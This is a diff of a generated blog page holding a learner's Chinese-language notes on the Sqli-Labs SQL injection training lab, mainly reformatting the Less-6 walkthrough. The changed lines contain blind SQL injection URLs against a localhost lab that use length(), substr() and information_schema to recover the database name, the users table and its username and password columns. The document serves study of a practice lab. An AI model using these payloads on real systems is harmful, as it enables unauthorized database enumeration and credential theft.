@@ -138,7 +138,7 @@
 <meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-57260168646d97f2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 <meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-4accd17dfa12b9d7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 <meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9216631-8f1f38a5e00e1428.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:updated_time" content="2019-03-11T12:46:51.678Z">
+<meta property="og:updated_time" content="2019-03-11T12:59:08.762Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Sqli-Labs">
 <meta name="twitter:description" content="写在前面此文用于记录学习SQL注入过程中的所得所思，因为可以说是菜鸟了，需要参考大佬的解题方法，所以一切慢慢来吧，希望越来越强。 做题过程中的各种知识 在mysql数据库中，单行注释有#和--，在实际操作中#号一般用%23来表示。而–则用--+来表示，主要是由于他的格式，前后要有空格，所以我们就用加号来表示空格。 与数据库相关的内容：   information_schema，系统数据库，包含所有">
@@ -562,9 +562,22 @@
 <li>就这样，一步一步试出第一个字母，得出为<code>s</code>。</li>
 </ul>
 <ol start="5">
-<li>下一步，判断其长度：还是二分法，慢慢试，由<code>http://localhost:8088/sqlilabs/Less-6/?id=1&quot; and length(database())=8--+</code> 访问正常知共有8个字母。然后如上一个一个试，通过<code>substr(database(),n,1)</code>。其实实处前面几个便可猜出为何单词，这里即为<code>security</code>。</li>
-<li>下面是猜表名：<code>http://localhost:8088/sqlilabs/Less-6/?id=1&quot; and substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 3,1),1,1)=&#39;u&#39; --+</code>这里工作量更大了，因为security中有四张表，每张都有id属性，下面设为<code>limit 3,1</code>,猜测表<code>users</code>的第一个字母<code>u</code>时才不会出错(还有第三张表<code>uagents</code> 即<code>limit 2,1</code>时猜测时也不会出错,所以得试好多次) 当然，一般我们需要的应该都是user表，所以也可以直接尝试<code>http://localhost:8088/sqlilabs/Less-6/?id=1&quot; and substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 3,1),1,5)=&#39;users&#39; --+</code> </li>
-<li>接着是列：构造类似，不一一说明：第一个属性为<code>id</code> ，已知；第二个<code>http://localhost:8088/sqlilabs/Less-6/?id=1&quot; and substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 1,1),1,8)=&#39;username&#39; --+</code>为<code>username</code>;；第三个为：<code>http://localhost:8088/sqlilabs/Less-6/?id=1&quot; and substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 2,1),1,8)=&#39;password&#39; --+</code> 为<code>password</code></li>
+<li>下一步，判断其长度：还是二分法，慢慢试，由<code>http://localhost:8088/sqlilabs/Less-6/?id=1&quot; and length(database())=8--+</code> 访问正常知共有8个字母。然后如上一个一个试，通过<code>substr(database(),n,1)</code>。其实得出前面几个便可猜出为何单词，这里即为<code>security</code>。</li>
+<li>下面是猜表名：<code>http://localhost:8088/sqlilabs/Less-6/?id=1&quot; and substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 3,1),1,1)=&#39;u&#39; --+</code></li>
+</ol>
+<ul>
+<li>这里工作量更大了，因为security中有四张表，每张都有id属性，下面设为<code>limit 3,1</code>,猜测表<code>users</code>的第一个字母<code>u</code>时才不会出错(还有第三张表<code>uagents</code> 即<code>limit 2,1</code>时猜测时也不会出错,所以得试好多次) </li>
+<li>当然，一般我们需要的应该都是users表，所以也可以直接尝试<code>http://localhost:8088/sqlilabs/Less-6/?id=1&quot; and substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 3,1),1,5)=&#39;users&#39; --+</code> </li>
+</ul>
+<ol start="7">
+<li>接着是列：构造类似，不一一说明：</li>
+</ol>
+<ul>
+<li>第一个属性为<code>id</code> ，已知</li>
+<li>第二个<code>http://localhost:8088/sqlilabs/Less-6/?id=1&quot; and substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 1,1),1,8)=&#39;username&#39; --+</code>为<code>username</code></li>
+<li>第三个为：<code>http://localhost:8088/sqlilabs/Less-6/?id=1&quot; and substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 2,1),1,8)=&#39;password&#39; --+</code> 为<code>password</code></li>
+</ul>
+<ol start="8">
 <li>最后是内容：这就更复杂了，因为每个字母都需要猜，实际工作量是非常大的，由于目前水平有限，语句的构造和注入方法都是比较愚笨的，还不知道其他更好的方法，所以就先到这里了。</li>
 </ol>
 <hr>
@@ -905,7 +918,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">16.2k</span>
+    <span title="Site words total count">16.1k</span>
   
 </div>
 
